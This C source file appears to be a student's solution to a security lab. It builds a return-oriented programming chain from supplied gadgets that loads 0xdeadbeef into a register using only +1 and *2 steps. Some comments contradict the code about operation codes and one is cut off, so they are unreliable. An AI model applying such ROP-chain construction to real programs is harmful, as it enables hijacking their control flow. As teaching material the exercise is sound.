#include "rop.h"
#include <assert.h>
#include <stddef.h>
#include <stdio.h>



/**reverse of an array**/
void reverse(int* array, size_t size) {
    for (size_t i = 0; i < size / 2; ++i) {
        size_t j = size - i - 1;
        int temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}


/**find operations to get value**/
int find_operations(int operations[100], long long number) {
    // 3 - operation multiplication by 2
    // 2 - operation increment by 1

    // number of operation
    int count = 0;

    while (number > 0) {
        // current value is even => let's divide by 2
        // it is more efficient
        if (number % 2 == 0) {
            operations[count] = 3;
            number /= 2;
            ++count;
        } else {
            operations[count] = 2;
            number -= 1;
            ++count;
        }
    }

    reverse(operations, count);
    return count;
}


// your code goes here
int make_ropchain(void* ropchain[])
{
    long long number = 0xdeadbeef;
    // let's construct a way to create this number by increments and *2 from 0
    // we can use dynamic programming
    // the size of the number is 32
    // => there will be <= 32 divisions by 2 and the same number (cause we won't do
    // 2 consecutive decrements, that is inefficient) of decrements
    // => there will be <= 64 operations
    // => 100 for array should be ok
    int operations[100];
    int count = find_operations(operations, number);
    // 1 - is +1
    // 2 - is *2
    int len = 0;
    // first operation is rdi = 0
    // then we have count operations of +1 and *2
    // then we put rdi on to the 8(%rsp)
    // after ret %rsp now points at rdi
    // then we pop the value in rax
    // => len can be found as 1 + count + 1 + 1 = count + 3
    len = count + 3;
    // now let's save addresses

    // set0
    ropchain[0] = gadgets[4];
    // calculating 0XDEADBEEF
    for (int i = 1; i <= count; ++i) {
        ropchain[i] = gadgets[operations[i - 1]];
    }
   
    // put oXDEADBEAF to 8(%rsp)
    // after ret 0XDEADBEEF is located at (%rsp)
    ropchain[1 + count] = gadgets[0];

    // pop (%rsp) to %rax
    ropchain[1 + count + 1] = gadgets[1];

    // return (length + 1) of the ropchain in bytes, cause we will 
    return (len + 1) * 8;
}
